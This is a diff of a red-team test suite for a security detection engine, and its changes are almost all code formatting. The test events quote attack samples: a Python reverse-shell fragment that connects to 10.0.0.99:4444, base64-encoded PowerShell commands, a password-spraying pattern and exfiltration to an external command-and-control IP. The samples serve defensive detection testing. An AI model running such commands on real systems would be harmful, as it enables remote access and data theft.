@@ -118,7 +118,7 @@ describe('Red Team - T1059: Command & Scripting Interpreter', () => {
         category: 'process_creation',
         description:
           "Process created: python -c 'import socket,subprocess,os;" +
-          "s=socket.socket();s.connect((\"10.0.0.99\",4444));os.dup2(s.fileno(),0)'",
+          's=socket.socket();s.connect(("10.0.0.99",4444));os.dup2(s.fileno(),0)\'',
         metadata: {
           processName: 'python',
           sourceIP: '10.0.0.51',
@@ -185,8 +185,7 @@ describe('Red Team - T1059: Command & Scripting Interpreter', () => {
       const event = makeSecurityEvent({
         source: 'process',
         category: 'process',
-        description:
-          'Process created: powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA',
+        description: 'Process created: powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA',
         metadata: {
           processName: 'powershell.exe',
           sourceIP: '10.0.0.54',
@@ -197,9 +196,7 @@ describe('Red Team - T1059: Command & Scripting Interpreter', () => {
       expect(result).not.toBeNull();
 
       // Should match Command and Scripting Interpreter rule (panguard-builtin-005)
-      const scriptMatch = result!.ruleMatches.find(
-        (m) => m.ruleId === 'panguard-builtin-005'
-      );
+      const scriptMatch = result!.ruleMatches.find((m) => m.ruleId === 'panguard-builtin-005');
       expect(scriptMatch).toBeDefined();
       expect(scriptMatch!.severity).toBe('high');
     });
@@ -208,8 +205,7 @@ describe('Red Team - T1059: Command & Scripting Interpreter', () => {
       const event = makeSecurityEvent({
         source: 'process',
         category: 'process',
-        description:
-          'Process created: powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYg',
+        description: 'Process created: powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYg',
         metadata: {
           processName: 'powershell.exe',
           sourceIP: '10.0.0.55',
@@ -219,9 +215,7 @@ describe('Red Team - T1059: Command & Scripting Interpreter', () => {
       const result = detectAgent.detect(event);
       expect(result).not.toBeNull();
 
-      const scriptMatch = result!.ruleMatches.find(
-        (m) => m.ruleId === 'panguard-builtin-005'
-      );
+      const scriptMatch = result!.ruleMatches.find((m) => m.ruleId === 'panguard-builtin-005');
       expect(scriptMatch).toBeDefined();
     });
   });
@@ -247,9 +241,7 @@ describe('Red Team - T1059: Command & Scripting Interpreter', () => {
       expect(result).not.toBeNull();
 
       // Should match panguard-builtin-005 (Command and Scripting Interpreter)
-      const match = result!.ruleMatches.find(
-        (m) => m.ruleId === 'panguard-builtin-005'
-      );
+      const match = result!.ruleMatches.find((m) => m.ruleId === 'panguard-builtin-005');
       expect(match).toBeDefined();
     });
 
@@ -268,9 +260,7 @@ describe('Red Team - T1059: Command & Scripting Interpreter', () => {
       const result = detectAgent.detect(event);
       expect(result).not.toBeNull();
 
-      const match = result!.ruleMatches.find(
-        (m) => m.ruleId === 'panguard-builtin-005'
-      );
+      const match = result!.ruleMatches.find((m) => m.ruleId === 'panguard-builtin-005');
       expect(match).toBeDefined();
     });
 
@@ -288,9 +278,7 @@ describe('Red Team - T1059: Command & Scripting Interpreter', () => {
       const result = detectAgent.detect(event);
       expect(result).not.toBeNull();
 
-      const match = result!.ruleMatches.find(
-        (m) => m.ruleId === 'panguard-builtin-005'
-      );
+      const match = result!.ruleMatches.find((m) => m.ruleId === 'panguard-builtin-005');
       expect(match).toBeDefined();
     });
   });
@@ -332,9 +320,7 @@ describe('Red Team - T1053: Scheduled Task/Job', () => {
       const result = detectAgent.detect(event);
       expect(result).not.toBeNull();
 
-      const cronMatch = result!.ruleMatches.find(
-        (m) => m.ruleId === 'panguard-builtin-006'
-      );
+      const cronMatch = result!.ruleMatches.find((m) => m.ruleId === 'panguard-builtin-006');
       expect(cronMatch).toBeDefined();
       expect(cronMatch!.severity).toBe('medium');
     });
@@ -353,9 +339,7 @@ describe('Red Team - T1053: Scheduled Task/Job', () => {
       const result = detectAgent.detect(event);
       expect(result).not.toBeNull();
 
-      const cronMatch = result!.ruleMatches.find(
-        (m) => m.ruleId === 'panguard-builtin-006'
-      );
+      const cronMatch = result!.ruleMatches.find((m) => m.ruleId === 'panguard-builtin-006');
       expect(cronMatch).toBeDefined();
     });
 
@@ -373,9 +357,7 @@ describe('Red Team - T1053: Scheduled Task/Job', () => {
       const result = detectAgent.detect(event);
       expect(result).not.toBeNull();
 
-      const cronMatch = result!.ruleMatches.find(
-        (m) => m.ruleId === 'panguard-builtin-006'
-      );
+      const cronMatch = result!.ruleMatches.find((m) => m.ruleId === 'panguard-builtin-006');
       expect(cronMatch).toBeDefined();
     });
 
@@ -419,9 +401,7 @@ describe('Red Team - T1053: Scheduled Task/Job', () => {
       const result = detectAgent.detect(event);
       expect(result).not.toBeNull();
 
-      const systemdMatch = result!.ruleMatches.find(
-        (m) => m.ruleId === 'panguard-builtin-007'
-      );
+      const systemdMatch = result!.ruleMatches.find((m) => m.ruleId === 'panguard-builtin-007');
       expect(systemdMatch).toBeDefined();
       expect(systemdMatch!.severity).toBe('medium');
     });
@@ -440,9 +420,7 @@ describe('Red Team - T1053: Scheduled Task/Job', () => {
       const result = detectAgent.detect(event);
       expect(result).not.toBeNull();
 
-      const systemdMatch = result!.ruleMatches.find(
-        (m) => m.ruleId === 'panguard-builtin-007'
-      );
+      const systemdMatch = result!.ruleMatches.find((m) => m.ruleId === 'panguard-builtin-007');
       expect(systemdMatch).toBeDefined();
     });
 
@@ -460,9 +438,7 @@ describe('Red Team - T1053: Scheduled Task/Job', () => {
       const result = detectAgent.detect(event);
       expect(result).not.toBeNull();
 
-      const systemdMatch = result!.ruleMatches.find(
-        (m) => m.ruleId === 'panguard-builtin-007'
-      );
+      const systemdMatch = result!.ruleMatches.find((m) => m.ruleId === 'panguard-builtin-007');
       expect(systemdMatch).toBeDefined();
     });
   });
@@ -487,9 +463,7 @@ describe('Red Team - T1053: Scheduled Task/Job', () => {
       const result = detectAgent.detect(event);
       expect(result).not.toBeNull();
 
-      const cronMatch = result!.ruleMatches.find(
-        (m) => m.ruleId === 'panguard-builtin-006'
-      );
+      const cronMatch = result!.ruleMatches.find((m) => m.ruleId === 'panguard-builtin-006');
       expect(cronMatch).toBeDefined();
     });
   });
@@ -725,7 +699,7 @@ describe('Red Team - T1110: Brute Force', () => {
           metadata: {
             result: 'failure',
             user: targetUsers[i],
-            password_hint: 'P@ssw0rd',  // all attempts use same password
+            password_hint: 'P@ssw0rd', // all attempts use same password
           },
         });
       }
@@ -857,9 +831,7 @@ describe('Red Team - T1021: Remote Services', () => {
       const result = detectAgent.detect(event);
       expect(result).not.toBeNull();
 
-      const lateralMatch = result!.ruleMatches.find(
-        (m) => m.ruleId === 'panguard-builtin-011'
-      );
+      const lateralMatch = result!.ruleMatches.find((m) => m.ruleId === 'panguard-builtin-011');
       expect(lateralMatch).toBeDefined();
       expect(lateralMatch!.severity).toBe('medium');
     });
@@ -879,9 +851,7 @@ describe('Red Team - T1021: Remote Services', () => {
       const result = detectAgent.detect(event);
       expect(result).not.toBeNull();
 
-      const match = result!.ruleMatches.find(
-        (m) => m.ruleId === 'panguard-builtin-011'
-      );
+      const match = result!.ruleMatches.find((m) => m.ruleId === 'panguard-builtin-011');
       expect(match).toBeDefined();
     });
   });
@@ -1130,9 +1100,7 @@ describe('Red Team - T1570: Lateral Tool Transfer', () => {
       expect(result).not.toBeNull();
 
       // Should match panguard-builtin-015 (Data Exfiltration Indicators)
-      const exfilMatch = result!.ruleMatches.find(
-        (m) => m.ruleId === 'panguard-builtin-015'
-      );
+      const exfilMatch = result!.ruleMatches.find((m) => m.ruleId === 'panguard-builtin-015');
       expect(exfilMatch).toBeDefined();
       expect(exfilMatch!.severity).toBe('high');
     });
@@ -1266,7 +1234,7 @@ describe('Red Team - T1570: Lateral Tool Transfer', () => {
         ruleIds: [],
         metadata: {
           destinationIP: '203.0.113.99', // external IP
-          bytesOut: 25 * 1024 * 1024,     // 25MB
+          bytesOut: 25 * 1024 * 1024, // 25MB
           destinationPort: 443,
         },
       });
@@ -1289,7 +1257,7 @@ describe('Red Team - T1570: Lateral Tool Transfer', () => {
         ruleIds: [],
         metadata: {
           destinationIP: '198.51.100.99', // external IP
-          bytesOut: 60 * 1024 * 1024,     // 60MB (>= 5x threshold of 10MB)
+          bytesOut: 60 * 1024 * 1024, // 60MB (>= 5x threshold of 10MB)
           destinationPort: 443,
         },
       });
@@ -1316,9 +1284,7 @@ describe('Red Team - T1570: Lateral Tool Transfer', () => {
       expect(result).not.toBeNull();
 
       // Should match panguard-builtin-015 (Data Exfiltration Indicators)
-      const exfilMatch = result!.ruleMatches.find(
-        (m) => m.ruleId === 'panguard-builtin-015'
-      );
+      const exfilMatch = result!.ruleMatches.find((m) => m.ruleId === 'panguard-builtin-015');
       expect(exfilMatch).toBeDefined();
     });
 
@@ -1435,7 +1401,7 @@ describe('Red Team - Multi-Technique Attack Chain', () => {
       ruleIds: [],
       metadata: {
         destinationIP: '198.51.100.99', // external C2 server
-        bytesOut: 30 * 1024 * 1024,     // 30MB exfiltrated
+        bytesOut: 30 * 1024 * 1024, // 30MB exfiltrated
       },
     });
 
